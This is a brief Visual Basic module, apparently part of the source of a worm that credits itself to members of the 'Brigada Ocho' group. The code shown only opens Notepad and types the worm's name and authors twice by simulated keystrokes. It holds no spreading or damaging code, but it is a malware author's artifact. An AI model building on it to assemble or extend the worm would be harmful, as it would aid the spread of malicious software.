Attribute VB_Name = "Module1"
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)


Sub main()
txt = "W32/W97M/ZIP.Brigada.Worm coded by PetiK and alc0paul " & _
        "from the ""Brigada Ocho"" group" & vbNewLine
Set ws = CreateObject("WScript.Shell")
ws.Run "notepad.exe"
Sleep 100
Do Until x = 2
For j = 1 To Len(txt)
ws.SendKeys Mid(txt, j, 1)
Sleep 50
Next
x = x + 1
Loop


End Sub
